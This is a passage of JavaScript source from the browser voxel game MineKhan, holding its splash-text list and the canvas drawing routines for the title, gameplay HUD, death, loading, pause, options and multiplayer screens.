      "Hard Parkour!",
      "MineKhan is on youtube!",
      "Original by Willard.",
      //"Log => 4 planks\n2 Planks => 4 sticks\n1 stick + 1 coal\n=\ntorch",
      "Annoying cactus!",
      "Nice looking flowers.",
      "So, you read splash text.",
      //document.documentElement.outerHTML.split("\n").length+" lines of code.",
			"50,000+ lines of code!",
      "Island world type\nhas a volcano.",
      "Awesome!",
      "Fun!",
      "Build!",
      "Mine!",
      "Craft!",
      "Would you like a potion of fun?",
      "Falling anvils are\neven more annoying\nthan sand!",
      "No tnt!!!",
      "Don't mess\naround with\nuranium!!!",
      "Why does my\nhouse have a\nhole in the\nroof???",
      //"www.thingmaker.repl.co",
      "1C2o3l4o5r6m7a8t9iac",
      "Using WebGL!",
      "Who has awesome hair?",
      "Supercalifragilisticexpialidocious!",
      "Really really fun!",
      "Not kidding",
      "Punch diamonds!",
      "Very long useless text,\nglorbouirewsoytuderkoilsykrojeticfilistikmensuiklit",
      "Really. You read\n splash text.",
      "Umm... Why are\nthe trees floating?",
      "This is a very\ncool splash.",
      "Can render 400,000 blocks!",
			"Updates incoming",
			"Not greyscale",
			"Sometimes, having a giant monitor is really helpful.",
			"Also try GameChiefCraft",
			"Also try Ultimate Platformer",
			"Don't mine bedrock",
      "TNT can be satisfying!",
      "Bamboo exsists in this game!",
      "The Jungle has big trees!",
      "More than 1000 users!",
      "If you don't eat the apple,\nwhat's it for?",
      "you should play this\n\ndude",
      "Play on servers!",
      //the ones below were suggested by repeat
      "Particularly amusing!",
      "What if there were 55 more days of the year?",
      "9+10!",
      "This line of text is without\nthe first symbol of the\nEnglish terminology!",
      "An alternative to touching grass!",
      "Ancient Debris!",
      "No Villagers!",
      "Doesn't include the Backrooms!",
      "Controversial Opinion:\nQueen Elizabeth had a Totem of Undying",
      "The customer is (sometimes) right!",
			//suggestions end here
			"Don't name a wolf \"error\"!",
			"Mountains!",
			"Jagged Peaks!",
			"Look! Dried leaves on the ground!",
			"Huge caves!",
			"Squiggly caves!",
			"Nether portals can be\nas small as 1 block.",
			"Huge worlds!",
			"Includes rare biomes!",
			"Bamboo forest  Bamboo jungle",
			"Complex command system!",
			"Deep valleys!",
			"Free!",
			"Uses fonts!",
			"Available!",
			"Simple user interface!",
			"Mostly secure!",
			"Works on the web!",
    ]
    let splash = ""
    function rdmSplash(){
      splash = splashs[Math.floor(Math.random()*splashs.length)]
    }
    win.rdmSplash = rdmSplash
    win.setSplash = function(s){
      splash = splashs[s]
    }
    win.setSplashText = function(str){
      splash = str
    }
    rdmSplash()
    setInterval(() => rdmSplash(), 60000)
		function drawTitle(offsetX) {
			const ss = inventory.ss
			let title = "MINEKHAN"
      //let titleWidth = images.minekhan.width*1.6*ss
      //let titleHeight = images.minekhan.height*1.6*ss
			let subtext = "JAVASCRIPT EDITION"
			let font = "thefont,monospace"
			strokeWeight(1)
			ctx.textAlign = 'center'

			if(win.weirdTitle) title = "MINKEHAN"
			//if(!images.minekhan.naturalWidth || win.weirdTitle){
			ctx.font = "bold "+(110*ss)+"px " + font
			fill(/*30*/70)
			text(title, width / 2+offsetX, 158/2*ss)
			//fill(40)
			text(title, width / 2+offsetX, 155/2*ss)
			ctx.font = "bold "+(111*ss)+"px " + font
			//fill(50)
			text(title, width / 2+offsetX, 152/2*ss)
			//fill(70)
			text(title, width / 2+offsetX, 150/2*ss)
			//fill(90)
			ctx.font = "bold "+(112*ss)+"px " + font
			text(title, width / 2+offsetX, 148/2*ss)
			fill(110)
			text(title, width / 2+offsetX, 145/2*ss)
			//}else
			//drawImage("minekhan", width/2 - (titleWidth/2), lerp(ctx.globalAlpha,-titleHeight,145*ss - titleHeight), titleWidth,titleHeight)

			ctx.font = "bold "+(32*ss)+"px " + font
			fill(50)
			text(subtext, width / 2-1+offsetX, 148*ss)
			text(subtext, width / 2+1+offsetX, 148*ss)
			text(subtext, width / 2+offsetX, 147*ss)
			text(subtext, width / 2+offsetX, 149*ss)
			ctx.font = "bold "+(32*ss)+"px " + font
			fill(150)
			text(subtext, width / 2+offsetX, 148*ss)
      
      fill(230,220,0)
			ctx.translate(width/2 + 280*ss,170*ss)
			ctx.rotate(-Math.PI/8);
      ctx.font = "10px "+font
      let w = ctx.measureText(splash).width
      let s = performFast ? 18 : ((sin(now/500*Math.PI)/*(size/10)*/*(100/w))+10+(500/w))
			ctx.font = "bold "+(s*ss*ctx.globalAlpha)+"px " + font
			text(splash, 0,0, s)
			ctx.rotate(Math.PI/8);
			ctx.translate(-(width/2+280*ss),-170*ss)
		}
    clear = x => ctx.clearRect(x || 0, 0, width, height)
    dirt = () => ctx.drawImage(dirtbg, changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0, 0, width,height)
    netherrack = () => ctx.drawImage(netherbg, changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0, 0, width,height)
    endstone = () => ctx.drawImage(endbg, changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0, 0, width,height)

    drawScreens["initLoading"] = () => {}
    
    /*var size = 0
    var sizes = 0
    var sizess = 1*/
		drawScreens["main menu"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			let offsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0
			if(changeSceneAnimation === null || !thisSceneCurrent || previousScreen !== "options" && !previousScreen.startsWith('options ') || previousScreen === "initLoading") clear()
      /*sizes += sizess
      if((sizes > 5) || (sizes < -5)){
        sizess = -sizess
      }
      size += sizes*/
			drawTitle(offsetX)
			fill(220)
			ctx.font = "16px thefont"
			ctx.textAlign = 'left'
			text("MineKhan-thingmaker " + version, 2, lerp(ctx.globalAlpha,height+16,height - 2 - 16))
      ctx.textAlign = "right"
			text("Press Ctrl+H to hide window. Press Ctrl+J to undo hide.", width - 2, height - 2 - 16)

			fill(0)
			ctx.fillRect(0,0,width,48)
			fill(255)
			ctx.textAlign = 'left'
			text("You can help make MineKhan more popular.\nTo do it, send the link to at least one other person. (https://thingmaker.us.eu.org/minekhan) \nAlso, if you have screenshots or worlds of MineKhan from 2022 or before, it would be helpful to put them at: https://thingmaker.us.eu.org", 0,0,16)
			ctx.globalAlpha = 1
		}
		drawScreens["comingsoon menu"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
			ctx.textAlign = 'center'
			fill(255)
			textSize(25)
			text("Coming soon", width / 2, lerp(ctx.globalAlpha,-25,height / 2 - 100), 25)
			ctx.globalAlpha = 1
    }

		drawScreens.play = () => {
      ctx2.clearRect(0,0,width,height)
      let now = Date.now()
      
      if((now - attackCooldownStart) / 1000 * 20 > attackCooldownTime){
        if(attackCooldown !== 0) updateHUD = true
        attackCooldown = 0
      }else{
        let prog = (now - attackCooldownStart) / 1000 * 20
        attackCooldown = prog / attackCooldownTime
        updateHUD = true
      }
			if(p.usingSpyglass || p.prevUsingSpyglass){
				updateHUD = true
			}
      
			if (updateHUD || p.effects.blur || changeSceneAnimation !== null) {
				if(!p.effects.blur && (changeSceneAnimation === null || !thisSceneCurrent)) clear()
				updateHUD = false
				hud()
				freezeFrame = false

				gl.clearColor(sky[0], sky[1], sky[2], 1.0)
				lantern = blockData[holding].lightLevel / 15 || 0
				gl.uniform1f(glCache.uLantern, lantern)
			}
			Messages.update()
      if(saving){
				let ss = inventory.ss
				fill(255)
				textSize(12)
				ctx.textAlign = "center"
				text(saving === "remote" ? "Saving remotely..." : "Saving...\nClose window to cancel.",width-55*ss,45*ss,12)
				ctx.textAlign = "left"
				if(autosaveTimer){
					fill(127)
					ctx.fillRect(width-110*ss,130*ss,100*ss,10*ss)
					fill(64,64,255)
					let a = (performance.now()-autosaveTimer)/5000
					ctx.fillRect(width-110*ss,130*ss,100*ss*(1-a),10*ss)
				}
				drawAutosave(width-55*ss,100*ss)
				updateHUD = true
			}
			defineWorld()
			if (!p.spectator && !settings.peformanceFast) {// crosshair
				let x = width / 2
				let y = height / 2
				ctx.drawImage(gl.canvas,(x-10)*resolution,(y-10)*resolution,20*resolution,20*resolution,x-10,y-10,20,20)
				ctx.lineWidth = 2
				ctx.strokeStyle = "#fc8"
				ctx.globalCompositeOperation = "difference"//invert colors
				ctx.beginPath()
				ctx.moveTo(x - 10, y)
				ctx.lineTo(x + 10, y)
				ctx.moveTo(x, y - 10)
				ctx.lineTo(x, y + 10)
				ctx.stroke()
				ctx.globalCompositeOperation = "source-over"
			}
			if(p.effects.blur){
				let blurry = p.effects.blur.level*min(p.effects.blur.time/80/*4 seconds*/,1)
				let amount = (now - lastBlur)/20
				if(lastBlur !== null) ctx.globalAlpha = 0.05*amount/blurry
				lastBlur = now
				ctx2.filter = 'blur('+(blurry*5)+'px)'
				ctx2.clearRect(0,0,width,height)
				ctx2.drawImage(gl.canvas, blurry*-20, 0, width,height)
				ctx2.globalAlpha = 0.5
				ctx2.drawImage(gl.canvas, blurry*20, 0, width,height)
				ctx2.globalAlpha = 1
				ctx2.filter = 'none'
				ctx.drawImage(canvas2,0,0)
				ctx.globalAlpha = 1
			}
      
      if(harmEffect > 0){
        fill(255,0,0, harmEffect*1.2)
        ctx.fillRect(0,0,width,height)
        updateHUD = true
      }
      if(p.burning && !p.thirdPerson){
        updateHUD = true
      }
      
      /*if(pTouch.touching){
				ctx.drawImage(gl.canvas,(pTouch.x-71)*resolution,(pTouch.y-71)*resolution,142*resolution,142*resolution,pTouch.x-71,pTouch.y-71,142,142)
			  ctx.beginPath()
        ctx.strokeStyle = ctx.fillStyle = "#fc8"
				ctx.globalCompositeOperation = "difference"//invert colors
        strokeWeight(2)
        ellipse(pTouch.x, pTouch.y, 70,70,false,true)
        if(pTouch.digProg > 0){
          ctx.beginPath()
          let r = pTouch.digProg * 68 //70 - 2
          ellipse(pTouch.x, pTouch.y, r,r,true)
        }
				ctx.globalCompositeOperation = "source-over"
        updateHUD=true
      }*/
      
      if(p.survival) ctx.drawImage(canvas2,0,0)
      
      if(titleShowing){
        if(now - (titleFadeIn+titleFadeOut+titleStay) < titleStart){
          let alpha = 1
          if(now - titleFadeIn < titleStart){
            alpha = (now - titleStart) / titleFadeIn
          }else if(now - titleFadeIn - titleStay - titleFadeOut < titleStart){
            alpha = 1-((now - titleStart - titleFadeIn - titleStay) / titleFadeOut)
          }
          ctx.font = "80px thefont"
          ctx.textAlign = "center"
          ctx.fillStyle = titleColor
          ctx.globalAlpha = alpha > 1 ? 1 : alpha
          text(title, width/2, height/2-40, 80)
          if(subtitle){
            ctx.font = "48px thefont"
            text(subtitle, width/2, height/2+50, 40)
          }
          ctx.globalAlpha = 1
          updateHUD = true
        }else titleShowing = false
      }
			if(discoverTime>0){
				if(tick) discoverTime -= 3
				let x
				if(discoverTime > 140){
					x = 1 - ((discoverTime - 140) / 60)
				}else if(discoverTime > 20){
					x = 1
				}else{
					x = discoverTime / 20
				}
				ctx.globalAlpha = x
				ctx.textAlign = "center"
				fill(255)
				textSize(80*x)
				text("You discovered",width/2,20)
				text("blockName."+discoverBlock,width/2,height-100)
				if(!blockData[discoverBlock])throw new Error("no block "+discoverBlock+" from discover")
				drawIcon(width/2, height/2, discoverBlock, null, null, x*10)
				ctx.globalAlpha = 1
				updateHUD = true
			}
      if(sideMessages.length){
				ctx.textAlign = "left"
				for(let i=0; i<sideMessages.length; i++){
					let m = sideMessages[i]
					if(tick) m.time -= 6
					let w = 200
					let y = i*50+20
					ctx.clearRect(width-w,y,w,50)
					if(m.time <= 0){
						sideMessages.splice(i,1)
						i--
						continue
					}
					let x
					if(m.time > 540){
						x = 1 - ((m.time - 540) / 60)
					}else if(m.time > 60){
						x = 1
					}else{
						x = m.time / 60
					}
					x = width - (x * w)
					ctx.fillStyle = "#223"
					ctx.fillRect(x, y,w,50)
					ctx.textBaseline = "top"
					ctx.fillStyle = "white"
					ctx.font = "10px thefont"
					text(m.title, x+5, y+5, w-10)
					ctx.fillStyle = "#aaa"
					text(m.content, x+5, y+20, w-10)
					ctx.textBaseline = "alphabetic"
				}
      }

      if(typeof win.eachFrame === "function") win.eachFrame()
		}

    drawScreens.dead = () => {
      defineWorld()
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			let prevOffsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-prevAnimationAmount)*width/4 : (prevAnimationAmount)*width/4) : 0
			let offsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0
			if(changeSceneAnimation === null || thisSceneCurrent){
				if(now - lastDeathTime > 10000){
					ctx.fillStyle = "black"
					ctx.fillRect(0,0,width,height)
				}else{
					let blurry = (now - lastDeathTime)/10000
					let amount = (now - lastBlur)/20
					lastBlur = now
					clear()
					ctx.filter = 'blur('+(blurry*5)+'px)'
					ctx.drawImage(gl.canvas, blurry*-20, 0, width,height)
					ctx.globalAlpha = 0.5
					ctx.drawImage(gl.canvas, blurry*20, 0, width,height)
					ctx.globalAlpha = 1
					ctx.filter = 'none'
					ctx2.globalAlpha = 0.05*amount/blurry
					ctx2.drawImage(canvas,0,0)
					ctx2.globalAlpha = 1
					ctx.drawImage(canvas2,0,0)
					ctx.fillStyle = "rgba(0,0,0,"+((now - lastDeathTime)/100)+"%)"
					ctx.fillRect(0,0,width,height)
				}
			}
			if(changeSceneAnimation !== null && !thisSceneCurrent) clear(prevOffsetX)
			let ss = inventory.ss
      
      ctx.fillStyle = "rgba(255,0,0,50%)"
      ctx.fillRect(offsetX,0,width,height)
      
      fill(0)
      ctx.font = (50*ss)+"px Arial"
      ctx.textAlign = "center"
      text(p.gameMode === "hardcore" ? "Game Over" : "You Died", width/2+offsetX, 60)
      
      ctx.font = (20*ss)+"px Arial"
      text(dieMessage, width/2+offsetX, 120)
      
      text("Score: "+p.level, width/2+offsetX, 160)
			ctx.globalAlpha = 1
    }
		drawScreens["temporary dead"] = () => {
			defineWorld()
			clear()
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			ctx.fillStyle = "black"
			ctx.fillRect(0,0,width,height)
			ctx.globalAlpha = 1
			if(thisSceneCurrent && now - lastDeathTime > 1000){
      	respawn()
				play()
			}
		}
    function drawChunkMap(cx,cz){
			let loadAmount = 0
			let w2 = settings.renderDistance+8, w = w2*2+1
      let s = min(width,height)/4/w
      for (let x = cx - w2; x <= cx + w2; x++) {
        for (let z = cz - w2; z <= cz + w2; z++) {
          ctx.fillStyle = "#000"
					let chunkLoadAmount = 0
					if(host){
						let chunk = serverWorld[p.dimension].getChunk(x*16,z*16)
						if (chunk) {
            	if(chunk.populated && chunk.generated) ctx.fillStyle = "#080", chunkLoadAmount = 3
							else if(chunk.caves && chunk.generated) ctx.fillStyle = "#666", chunkLoadAmount = 2
							else if(chunk.generated) ctx.fillStyle = "#444", chunkLoadAmount = 1
						}
					}
					let chunk = world.getChunk(x*16,z*16,p.dimension)
          if (chunk) {
            /*if(chunk.buffer) ctx.fillStyle = "#fff"
            else if(chunk.optimized) ctx.fillStyle = "#ff0"
            else if(chunk.lit) ctx.fillStyle = "#CCCCCC"
            else if(chunk.loaded) ctx.fillStyle = "#0ff"
            else if(chunk.populated) ctx.fillStyle = "#21C600"
            else if(chunk.caves) ctx.fillStyle = "#6D665C"
            else if(chunk.generated) ctx.fillStyle = "#D1D1D1"*/
            if(chunk.buffer) ctx.fillStyle = "#fff", chunkLoadAmount = 7
            else if(chunk.optimized) ctx.fillStyle = "#ccc", chunkLoadAmount = 6
						else if(chunk.lit) ctx.fillStyle = "#aa0", chunkLoadAmount = 5
            else if(chunk.loaded) ctx.fillStyle = "#888", chunkLoadAmount = 4
          }
          ctx.fillRect(floor(width/2 + (x-cx)*s), floor(height*0.65 + (z-cz)*s), ceil(s),ceil(s))
					if(maxDist(cx,cz,x,z) <= 1) loadAmount += chunkLoadAmount/7
        }
      }
			return loadAmount
		}
		drawScreens.loading = () => {
			let sub = 0
			let findingLand
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			if(thisSceneCurrent){
				p.dimension = ""
				if (host && serverWorld.worldType === "island" && serverWorld.islandGenerator.stage < 10) {
				} else if(host && serverWorld.worldType === "large" && !serverWorld.spawnPoint.land){
					findingLand = true
				} else {
					let standing = true
					/*if (world.loadFrom.length) { //not needed because save from loadFrom
						let load = world.loadFrom[0]
						p.x = load.x * 16
						p.y = load.y * 16
						p.z = load.z * 16
						standing = false
					} else {*/
					/*p.x = p2.x
					p.y = p2.y
					p.z = p2.z*/

					let cx = p.x >> 4
					let cz = p.z >> 4

					for (let x = cx - 1; x <= cx + 1; x++) {
						for (let z = cz - 1; z <= cz + 1; z++) {
							let chunk = world.getChunk(x*16,z*16,"")
							if (!chunk || !chunk.buffer) {
								standing = false
							} else {
								sub++
							}
						}
					}
					//}
					if (standing && !doEndPoem || skipWaitingLoading) {
						skipWaitingLoading = false
						/*p.x = p2.x
						p.y = p2.y
						p.z = p2.z*/
						play()
						//if you change below, add it to html.loading.onexit
						//if(portalFadeOutEffect > 0) blockData[blockIds.portal].doneLoading()
						//else if(fromEndPortal) blockData[blockIds.endPortal].doneLoading()
						return
					}
				}
			}else clear()

			if(thisSceneCurrent) dirt()
			fill(255)
			textSize(25)
			ctx.textAlign = "center"
			if(!findingLand && !doEndPoem){
        let cx = p.x >> 4
        let cz = p.z >> 4
        sub = drawChunkMap(cx,cz)

				let progress = Math.round( (serverWorld && serverWorld.worldType==="island" ? 45 : 100) * sub / maxLoad)
				if(serverWorld && serverWorld.worldType === "island") progress += Math.round((serverWorld.islandGenerator.stage/9.0+serverWorld.islandGenerator.h/serverWorld.islandGenerator.size*3/9)*50)
			
				fill(255)
        text(`Loading... ${progress}% complete`, width / 2, height / 2-50)
				drawLoadBar(width/2,height/2,4)
      }else if(findingLand && !doEndPoem){
				let progress = Math.round(serverWorld.spawnPoint.landProg*100)
				text(`Finding Land... checked ${progress}% of chunks`, width / 2, height / 2-50)
				drawLoadBar(width/2,height/2,2)
			}
			if(!doEndPoem){
				textSize(18)
				fill(255)
				text("Generating World",width/2,20)
			}
			ctx.globalAlpha = 1
		}
		drawScreens.netherLoading = () => {
			let sub = 0
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			if(thisSceneCurrent){
				p.dimension = "nether"
				let standing = true
				/*p.x = p2.x
				p.y = p2.y
				p.z = p2.z*/

				let cx = p.x >> 4
				let cz = p.z >> 4

				for (let x = cx - 1; x <= cx + 1; x++) {
					for (let z = cz - 1; z <= cz + 1; z++) {
						let chunk = world.getChunk(x*16,z*16,"nether")
						if (!chunk || !chunk.buffer) {
							standing = false
						} else {
							sub++
						}
					}
				}

				if (standing || skipWaitingLoading) {
					skipWaitingLoading = false
					/*p.x = p2.x
					p.y = p2.y
					p.z = p2.z*/
					play()
					//if(portalFadeOutEffect > 0) blockData[blockIds.portal].doneLoading()
					return
				}
			}else clear()
			
			if(thisSceneCurrent) netherrack()

			let cx = p.x >> 4
      let cz = p.z >> 4
      sub = drawChunkMap(cx,cz)
			let progress = Math.round(100 * sub / maxLoad)

			fill(255)
			textSize(25)
			ctx.textAlign = "center"
			text(`Loading... ${progress}% complete`, width / 2, height / 2-50)
			drawLoadBar(width/2,height/2,4)

      ctx.globalAlpha = 1
		}
    
    drawScreens.endLoading = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			let sub = 0
			if(thisSceneCurrent){
				p.dimension = "end"
				let standing = true
				/*p.x = p2.x
				p.y = p2.y
				p.z = p2.z*/

				let cx = p.x >> 4
				let cz = p.z >> 4

				for (let x = cx - 1; x <= cx + 1; x++) {
					for (let z = cz - 1; z <= cz + 1; z++) {
						let chunk = world.getChunk(x*16,z*16,"end")
						if (!chunk || !chunk.buffer) {
							standing = false
						} else {
							sub++
						}
					}
				}

				if (standing || skipWaitingLoading) {
					skipWaitingLoading = false
					/*p.x = p2.x
					p.y = p2.y
					p.z = p2.z*/
					play()
					//if(fromEndPortal) blockData[blockIds.endPortal].doneLoading()
					return
				}
			}else clear()
			
			if(thisSceneCurrent) endstone()
      let cx = p.x >> 4
      let cz = p.z >> 4
      sub = drawChunkMap(cx,cz)
			let progress = Math.round(100 * sub / maxLoad)

			fill(255)
			textSize(25)
			ctx.textAlign = "center"
			text(`Loading... ${progress}% complete`, width / 2, height / 2-50)
			drawLoadBar(width/2,height/2,4)

			ctx.globalAlpha = 1
		}
    
    drawScreens.endPoem = () => {
      drawScreens.loading()
      if(doEndPoem){
        dirt()
      }
    }
    
    drawScreens.chat = () => {
      defineWorld()
      clear()
    }
    
		editSignBox.oninput = () => {
			var tags = world.getTags(containerData.x,containerData.y,containerData.z,containerData.dimension)
			world.setTagByName(containerData.x,containerData.y,containerData.z,containerData.side?"text2":"text",editSignBox.value,true,containerData.dimension)
			send({type:"containerChangeSign",side:containerData.side,data:editSignBox.value})
		}
    drawScreens["edit sign"] = () => {
      var tags = world.getTags(containerData.x,containerData.y,containerData.z,containerData.dimension)
      if(!tags || !tags.sign){
        play()
        return
      }
			let whichText = containerData.side ? tags.text2 : tags.text
			if((whichText || "") !== editSignBox.value){
        editSignBox.value = whichText || ""
      }
      defineWorld()
      clear()
      textSize(50)
			fill(0, 0, 0)
			ctx.textAlign = 'center'
			text("Edit Sign", width / 2, 60)
    }

		drawScreens.inventory = drawInv
    drawScreens.crafting = drawCrafting
    drawScreens.furnace = drawFurnace
    drawScreens.chest = drawChest
    drawScreens.anvil = drawAnvil
    drawScreens.dispenser = drawDispenser
    drawScreens.hopper = drawHopper

		commandBlockInput.oninput = () => {
			if(!containerData.data) return
			containerData.data.data = commandBlockInput.value
			//world.updateTags(containerData.x,containerData.y,containerData.z,containerData.dimension)
			send({type:"containerChangeCommandBlock",data:containerData.data.data})
			commandBlockOverlay.innerHTML = Messages.hilightCommand(commandBlockInput).overlay
		}
		commandBlockInput.onscroll = () => commandBlockOverlay.scrollTop = commandBlockInput.scrollTop
		drawScreens.commandBlock = () => {
      let block = world.getBlock(containerData.x, containerData.y, containerData.z,containerData.dimension)
			let data = world.getTags(containerData.x, containerData.y, containerData.z,containerData.dimension)
			containerData.data = data
			let output = data ? data.output : ""
			let input = data ? data.data : ""
			if(output !== commandBlockOutput.prevValue){
				commandBlockOutput.prevValue = output
				commandBlockOutput.innerHTML = Messages.format(output)
			}
			if(commandBlockInput.value !== input){
				commandBlockInput.value = input
				commandBlockOverlay.innerHTML = Messages.hilightCommand(commandBlockInput).overlay
			}
      defineWorld()
      clear()
    }
    
    drawScreens.sleep = () => {
      defineWorld()
      if(thisSceneCurrent && skyLight > 0.5){
        p.y += p.height*0.5
				p.sleeping = false
        return play()
      }
      
      clear()
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      fill(0,0,0,50)
      ctx.fillRect(0,0,width,height)
      
			textSize(20)
			fill(255)
			ctx.textAlign = 'center'
			text(`${sleepCount} of ${sleepTotal} players sleeping.`, width / 2, height - 90)
			ctx.globalAlpha = 1
    }

    drawScreens["custom menu"] = () => {
      defineWorld()
    }

		drawScreens.pause = () => {
			strokeWeight(1)
			if(changeSceneAnimation === null || !thisSceneCurrent) clear()

			const ss = inventory.ss
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			textSize(50*ss)
			fill(0, 0, 0)
			ctx.textAlign = 'center'
			text((!host || serverWorld.players.length>1 ? "Not " : "")+"Paused", width / 2, lerp(ctx.globalAlpha,-50*ss,60*ss))
			ctx.globalAlpha = 1
		}

		drawScreens.options = () => {
      if(changeSceneAnimation === null || !thisSceneCurrent) clear()
		}
    drawScreens.worldSettings = () => {
      if(changeSceneAnimation === null || !thisSceneCurrent) clear()
			if(previousScreen === "creation menu") dirt()
    }
		drawScreens["options resourcePacks"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
      ctx.textAlign = 'center'
			textSize(25)
			fill(255)
			text("Resource Packs", width / 2, 15)
			ctx.globalAlpha = 1
		}
    drawScreens["options controls"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
      ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text(false ? "So, I hear you want to change some controls." : "Controls", width / 2, 20)
			ctx.globalAlpha = 1
    }
    drawScreens["options narrator"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
      ctx.textAlign = 'center'
			const ss = inventory.ss
			textSize(18*ss)
			fill(255)
			text("Narrator", width / 2, 25*ss)
			ctx.globalAlpha = 1
    }
    drawScreens["options help"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			if(changeSceneAnimation === null || thisSceneCurrent) dirt()
			else clear()
      ctx.textAlign = 'center'
			textSize(25)
			fill(255)
			text("Help", width / 2, 15)
			ctx.globalAlpha = 1
    }
    drawScreens["options languages"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
      ctx.textAlign = 'center'
			textSize(25)
			fill(255)
			text("Change language", width / 2, 15)
			ctx.globalAlpha = 1
    }
		drawScreens["creation menu"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
			ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Create New World", width / 2, lerp(ctx.globalAlpha,-18,2))
			ctx.globalAlpha = 1
		}
		drawScreens["loadsave menu"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
			dirt()
			ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Select World", width / 2, lerp(ctx.globalAlpha,-18,2))
			ctx.globalAlpha = 1
		}
    drawScreens["broken world"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
			ctx.textAlign = 'center'
			fill(255)
			textSize(25)
			text("This world is an old world.\nIt might be broken.\nAre you sure you want to load it?", width / 2, lerp(ctx.globalAlpha,-25,height / 2 - 75), 25)
			ctx.globalAlpha = 1
    }
    drawScreens["multiplayer menu"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
			ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Select server", width / 2, lerp(ctx.globalAlpha,-18,20))
			ctx.globalAlpha = 1
    }
    drawScreens["multiplayer connecting"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
			ctx.textAlign = 'center'
			let offsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0
			fill(255)
			textSize(25)
			text("Connecting...", width / 2+offsetX, height / 2 - 65)
			textSize(18)
      //if(connectingProgress) text(connectingProgress, width / 2+offsetX, height / 2-18)
			drawLoadBar(width/2+offsetX,height/2+85)
			ctx.globalAlpha = 1
    }
    drawScreens["multiplayer lost"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
			ctx.textAlign = 'center'
			let offsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0
			fill(255)
			textSize(25)
			text("Connection lost!", width / 2+offsetX, height / 2 - 65)
      if(multiplayerError && multiplayerError.data){
        if(typeof multiplayerError.data !== "string"){
          multiplayerError.data = multiplayerError.toString()
        }
        textSize(18)
        text(multiplayerError.data, width / 2+offsetX, height / 2-18, 18)
      }
			ctx.globalAlpha = 1
    }
    drawScreens["multiplayer lost long"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
      ctx.textAlign = 'center'
			let offsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0
			fill(255)
			textSize(25)
			text("Connection lost!", width / 2+offsetX, 15)
			ctx.globalAlpha = 1
    }
		drawScreens["multiplayer disconnecting"] = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
			ctx.textAlign = 'center'
			let offsetX = changeSceneAnimation ? (thisSceneCurrent ? (1-animationAmount)*width/4 : (animationAmount)*width/4) : 0
			fill(255)
			textSize(25)
			text("Disconnecting...", width / 2+offsetX, height / 2)
			drawLoadBar(width/2+offsetX,height/2+100)
			ctx.globalAlpha = 1
    }
		drawScreens.editworld = dirt
    drawScreens.marketplace = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
      ctx.textAlign = 'center'
			textSize(18)
			fill(255)
			text("Marketplace", width / 2, lerp(ctx.globalAlpha,-18,2))
			ctx.globalAlpha = 1
    }
    drawScreens["marketplace info"] = drawScreens.marketplace
    drawScreens.downloading = () => {
			ctx.globalAlpha = changeSceneAnimation ? (thisSceneCurrent ? animationAmount : 1-animationAmount) : 1
      dirt()
			ctx.textAlign = 'center'
